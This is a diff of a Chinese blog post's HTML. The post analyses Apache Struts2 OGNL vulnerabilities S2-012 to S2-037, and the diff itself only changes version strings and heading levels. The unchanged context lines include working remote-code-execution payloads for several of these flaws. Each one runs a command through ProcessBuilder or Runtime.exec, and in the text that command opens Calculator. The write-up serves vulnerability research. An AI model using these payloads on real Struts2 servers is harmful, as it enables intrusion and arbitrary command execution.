@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Struts2：你说你好累，已无法再爱上谁（二） | 素十八</title>
 <meta name="description" content="你救赎的人 终将成为你的光" />
-<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1620606541755">
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1620959747298">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://su18.org/styles/main.css">
@@ -29,7 +29,7 @@
       <div class="main-content">
         <div class="site-header">
   <a href="https://su18.org">
-  <img class="avatar" src="https://su18.org/images/avatar.png?v=1620606541755" alt="">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1620959747298" alt="">
   </a>
   <h1 class="site-title">
     素十八
@@ -128,8 +128,7 @@
               <div class="post-content">
                 <h1 id="前言">前言</h1>
 <p>书接上回，本篇记录 s2-012/s2-013/S2-014/s2-015/s2-016/s2-018/s2-019/s2-020/s2-021/s2-022/s2-026/s2-032/s2-033/s2-037 的调试过程。</p>
-<h1 id="漏洞分析">漏洞分析</h1>
-<h2 id="s2-012">S2-012</h2>
+<h1 id="s2-012">S2-012</h1>
 <p>漏洞触发原理与 S2-001 类似，对 <code>%{}</code> 表达式进行了循环解析。</p>
 <blockquote>
 <p>影响版本：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2<br>
@@ -158,7 +157,7 @@
 <pre><code>param=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,new java.lang.ProcessBuilder(new java.lang.String[]{&quot;open&quot;,&quot;-a&quot;,&quot;Calculator.app&quot;}).start())(su18)&amp;(param)(su19)
 </code></pre>
 <p>没想到啊没想到，妙啊妙啊。</p>
-<h2 id="s2-013">S2-013</h2>
+<h1 id="s2-013">S2-013</h1>
 <p>S2-013 也是 Struts2 链接标签解析导致的漏洞。</p>
 <blockquote>
 <p>影响版本：Struts 2.0.0 - Struts 2.3.14.1<br>
@@ -198,7 +197,7 @@
 <pre><code>%{#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@java.lang.Runtime@getRuntime().exec(&quot;open -a Calculator.app&quot;)}
 </code></pre>
 <p>与 S2-012 的 payload 一致。</p>
-<h2 id="s2-014">S2-014</h2>
+<h1 id="s2-014">S2-014</h1>
 <p>而 S2-014 是对 S2-013 修复不足的绕过。</p>
 <blockquote>
 <p>影响版本：Struts 2.0.0 - Struts 2.3.14.1<br>
@@ -212,7 +211,7 @@
 <p>这个方法指定 openChars 可以为 <code>$</code> <code>%</code>，所以可以除了使用 <code>%{}</code> ，也可以使用 <code>${}</code> 包裹表达式。因此 payload 为：</p>
 <pre><code>${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@java.lang.Runtime@getRuntime().exec(&quot;open -a Calculator.app&quot;)}
 </code></pre>
-<h2 id="s2-015">S2-015</h2>
+<h1 id="s2-015">S2-015</h1>
 <p>Struts2 返回结果时，将用户可控的参数拿来解析，就会导致漏洞。</p>
 <blockquote>
 <p>影响版本：Struts 2.0.0 - Struts 2.3.14.2<br>
@@ -258,7 +257,7 @@
 <p>在处理返回结果时，处理响应包头部信息使用 HttpHeaderResult 类的 <code>execute()</code> 方法，取得<code>${message}</code> 的内容，然后调用 <code>TextParseUtil.translateVariables()</code> 进行解析。</p>
 <figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1619763862616.png" alt="" loading="lazy"></figure>
 <p>payload 与之前一致。</p>
-<h2 id="s2-016">S2-016</h2>
+<h1 id="s2-016">S2-016</h1>
 <p>与 S2-012 触发点一致，但入口点不同的漏洞。</p>
 <blockquote>
 <p>影响版本：Struts 2.0.0 - Struts 2.3.15<br>
@@ -294,7 +293,7 @@
 <pre><code>redirectAction:%{new java.lang.ProcessBuilder(new java.lang.String[]{&quot;open&quot;, &quot;-a&quot;,&quot;Calculator.app&quot;}).start()}
 </code></pre>
 <p>同样地，再次漏洞中使用 <code>%</code> 或 <code>$</code> 均可。</p>
-<h2 id="s2-018s2-019">S2-018/S2-019</h2>
+<h1 id="s2-018s2-019">S2-018/S2-019</h1>
 <p>两个在网上没什么分析的洞，但是影响应该也不小。</p>
 <blockquote>
 <p>影响版本：Struts 2.0.0 - Struts 2.3.15.2、Struts 2.0.0 - Struts 2.3.15.1<br>
@@ -324,7 +323,7 @@
 <p>那如何访问不同命名空间中的方法呢？这里偷懒直接看一下 diff：</p>
 <figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1619948065129.png" alt="" loading="lazy"></figure>
 <p>发现在更新后，对 <code>action:</code> 前缀后面的值处理了 &quot;/&quot;，并对包含 &quot;/&quot; 的值进行了截取。</p>
-<h2 id="s2-020s2-021s2-022">S2-020/S2-021/s2-022</h2>
+<h1 id="s2-020s2-021s2-022">S2-020/S2-021/s2-022</h1>
 <p>官方接收了各个安全团队的报告后更新了它的正则。</p>
 <blockquote>
 <p>影响版本：Struts 2.0.0 - Struts 2.3.16.1、Struts 2.0.0 - Struts 2.3.16.3<br>
@@ -429,7 +428,7 @@ Class.classLoader.resources.dirContext.docBase=
 </code></pre>
 <p>于是 S2-021 的修复又添加了对 classloader 字符的拦截。</p>
 <p>而 S2-022 与之前是相同的漏洞，只不过由触发点由 ParametersInterceptor  变为了 CookieInterceptor。不再赘述。</p>
-<h2 id="s2-026">S2-026</h2>
+<h1 id="s2-026">S2-026</h1>
 <p>Struts2 官方继续维护它的正则。</p>
 <blockquote>
 <p>影响版本：Struts 2.0.0 - Struts Struts 2.3.24<br>
@@ -441,7 +440,7 @@ Class.classLoader.resources.dirContext.docBase=
 <pre><code>&quot;(^|\\%\\{)((#?)(top(\\.|\\['|\\[\&quot;)|\\[\\d\\]\\.)?)(dojo|struts|session|request|response|application|servlet(Request|Response|Context)|parameters|context|_memberAccess)(\\.|\\[).*&quot;,
 &quot;^(action|method):.*&quot;
 </code></pre>
-<h2 id="s2-032">S2-032</h2>
+<h1 id="s2-032">S2-032</h1>
 <p>本漏洞可以理解为 S2-016 漏洞的延续，对于特殊的访问前缀，除了 redirect\redirectAction 外，这次我们将注意力放到了 method 上。</p>
 <blockquote>
 <p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)<br>
@@ -486,7 +485,7 @@ Class.classLoader.resources.dirContext.docBase=
 <p>在 OGNL 表达式中，还有一种方式那就是 <code>@a@class</code> 的方式，这种方式不同于 <code>getClass()</code> 的方法调用方式，将由 ClassResolver 的实现类获取类的 Class 对象，具体实现是 <code>Class.forName('a')</code> 或者是使用当前线程的 ClassLoader 去 loadClass。</p>
 <figure data-type="image" tabindex="28"><img src="https://su18.org/post-images/1620555768888.png" alt="" loading="lazy"></figure>
 <p>这种使用方式将在 S2-045 中进行使用，此处不进行扩展。</p>
-<h2 id="s2-033">S2-033</h2>
+<h1 id="s2-033">S2-033</h1>
 <p>与 S2-032 漏洞逻辑相同，由于动态方法调用时对 methodName 没有进行处理，导致了漏洞。</p>
 <blockquote>
 <p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)<br>
@@ -512,7 +511,7 @@ Class.classLoader.resources.dirContext.docBase=
 </code></pre>
 <p>成功弹出计算器：</p>
 <figure data-type="image" tabindex="33"><img src="https://su18.org/post-images/1620460855925.png" alt="" loading="lazy"></figure>
-<h2 id="s2-037">S2-037</h2>
+<h1 id="s2-037">S2-037</h1>
 <p>REST 形式访问时，对解析的 methodName 没有过滤导致了漏洞。</p>
 <blockquote>
 <p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28.1<br>
@@ -529,8 +528,6 @@ Class.classLoader.resources.dirContext.docBase=
               <div class="toc-container">
                 <ul class="markdownIt-TOC">
 <li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
-<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a>
-<ul>
 <li><a href="#s2-012">S2-012</a></li>
 <li><a href="#s2-013">S2-013</a></li>
 <li><a href="#s2-014">S2-014</a></li>
@@ -542,8 +539,6 @@ Class.classLoader.resources.dirContext.docBase=
 <li><a href="#s2-032">S2-032</a></li>
 <li><a href="#s2-033">S2-033</a></li>
 <li><a href="#s2-037">S2-037</a></li>
-</ul>
-</li>
 </ul>
 
               </div>
